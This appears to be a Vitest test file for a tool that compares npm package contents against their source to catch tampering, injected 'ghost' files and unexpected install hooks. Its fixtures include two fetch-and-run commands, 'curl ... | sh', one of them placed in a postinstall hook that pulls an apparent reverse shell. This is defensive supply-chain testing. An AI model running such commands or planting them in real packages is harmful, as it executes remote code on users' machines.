import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import fsp from 'node:fs/promises';
import path from 'node:path';
import os from 'node:os';
import { GhostCodeComparator } from '../src/comparator/comparator.js';

describe('GhostCodeComparator', () => {
  let tempDir: string;
  let sourceDir: string;
  let packageDir: string;
  let comparator: GhostCodeComparator;

  beforeEach(async () => {
    tempDir = await fsp.mkdtemp(path.join(os.tmpdir(), 'wannabe-comp-test-'));
    sourceDir = path.join(tempDir, 'source');
    packageDir = path.join(tempDir, 'package');
    await fsp.mkdir(sourceDir, { recursive: true });
    await fsp.mkdir(packageDir, { recursive: true });
    comparator = new GhostCodeComparator();
  });

  afterEach(async () => {
    await fsp.rm(tempDir, { recursive: true, force: true });
  });

  it('correctly matches identical directories', async () => {
    await fsp.writeFile(path.join(sourceDir, 'README.md'), '# Project');
    await fsp.writeFile(path.join(packageDir, 'README.md'), '# Project');

    const result = await comparator.compareDirectories(sourceDir, packageDir);
    expect(result.summary.matchedFiles).toBe(1);
    expect(result.summary.modifiedFiles).toBe(0);
    expect(result.summary.addedFiles).toBe(0);
    expect(result.fileDiffs[0]?.status).toBe('identical');
  });

  it('detects modified files with differing content', async () => {
    await fsp.writeFile(path.join(sourceDir, 'index.js'), 'console.log("original");');
    await fsp.writeFile(path.join(packageDir, 'index.js'), 'console.log("tampered");');

    const result = await comparator.compareDirectories(sourceDir, packageDir);
    expect(result.summary.modifiedFiles).toBe(1);
    expect(result.fileDiffs[0]?.status).toBe('modified');
    expect(result.fileDiffs[0]?.sourceSha256).not.toBe(result.fileDiffs[0]?.packageSha256);
  });

  it('flags ghost code files added only in the published package', async () => {
    await fsp.writeFile(path.join(sourceDir, 'index.js'), 'console.log("clean");');
    await fsp.writeFile(path.join(packageDir, 'index.js'), 'console.log("clean");');
    await fsp.writeFile(path.join(packageDir, 'ghost.js'), 'console.log("stealth");');

    const result = await comparator.compareDirectories(sourceDir, packageDir);
    expect(result.summary.addedFiles).toBe(1);

    const ghostDiff = result.fileDiffs.find((d) => d.path === 'ghost.js');
    expect(ghostDiff?.status).toBe('added_in_package');
    expect(ghostDiff?.flags.some((f) => f.ruleId === 'WANNABE-GHOST-CODE')).toBe(true);
  });

  it('assigns critical severity to unmapped executable scripts or binaries', async () => {
    await fsp.writeFile(path.join(sourceDir, 'index.js'), 'console.log("clean");');
    await fsp.writeFile(path.join(packageDir, 'index.js'), 'console.log("clean");');
    await fsp.writeFile(path.join(packageDir, 'setup.sh'), '#!/bin/sh\ncurl -s http://evil | sh');

    const result = await comparator.compareDirectories(sourceDir, packageDir);
    const shDiff = result.fileDiffs.find((d) => d.path === 'setup.sh');
    expect(shDiff?.status).toBe('added_in_package');

    const flag = shDiff?.flags.find((f) => f.ruleId === 'WANNABE-GHOST-CODE');
    expect(flag?.severity).toBe('critical');
    expect(flag?.category).toBe('unmapped_binary');
  });

  it('disambiguates expected build artifacts like dist/*.js matching src/*.ts', async () => {
    await fsp.mkdir(path.join(sourceDir, 'src'), { recursive: true });
    await fsp.writeFile(path.join(sourceDir, 'src/index.ts'), 'export const a = 1;');

    await fsp.mkdir(path.join(packageDir, 'dist'), { recursive: true });
    await fsp.writeFile(path.join(packageDir, 'dist/index.js'), 'export var a = 1;');
    await fsp.writeFile(path.join(packageDir, 'dist/index.d.ts'), 'export declare const a: number;');

    const result = await comparator.compareDirectories(sourceDir, packageDir);
    const distJs = result.fileDiffs.find((d) => d.path === 'dist/index.js');
    const distDts = result.fileDiffs.find((d) => d.path === 'dist/index.d.ts');

    expect(distJs?.status).toBe('expected_build_artifact');
    expect(distDts?.status).toBe('expected_build_artifact');
    expect(result.summary.expectedArtifacts).toBe(2);
  });

  it('flags uncommitted lifecycle hooks in package.json as critical security threat', async () => {
    const sourcePkgJson = {
      name: 'victim-package',
      version: '1.0.0',
      scripts: {
        test: 'vitest'
      }
    };
    const poisonedPkgJson = {
      name: 'victim-package',
      version: '1.0.0',
      scripts: {
        test: 'vitest',
        postinstall: 'curl -s https://malware.cdn/revshell | sh'
      }
    };

    await fsp.writeFile(path.join(sourceDir, 'package.json'), JSON.stringify(sourcePkgJson));
    await fsp.writeFile(path.join(packageDir, 'package.json'), JSON.stringify(poisonedPkgJson));

    const result = await comparator.compareDirectories(sourceDir, packageDir);
    expect(result.summary.criticalFlags).toBeGreaterThanOrEqual(1);

    const pkgDiff = result.fileDiffs.find((d) => d.path === 'package.json');
    const hookFlag = pkgDiff?.flags.find((f) => f.ruleId === 'WANNABE-UNCOMMITTED-HOOK');
    expect(hookFlag).toBeDefined();
    expect(hookFlag?.severity).toBe('critical');
    expect(hookFlag?.message).toContain('postinstall');
  });

  it('unwraps standard npm internal "package/" subfolder seamlessly', async () => {
    const innerPkgDir = path.join(packageDir, 'package');
    await fsp.mkdir(innerPkgDir, { recursive: true });

    await fsp.writeFile(path.join(sourceDir, 'index.js'), 'console.log("hello");');
    await fsp.writeFile(path.join(innerPkgDir, 'index.js'), 'console.log("hello");');

    const result = await comparator.compareDirectories(sourceDir, packageDir);
    expect(result.summary.matchedFiles).toBe(1);
    expect(result.fileDiffs[0]?.path).toBe('index.js');
    expect(result.fileDiffs[0]?.status).toBe('identical');
  });
});
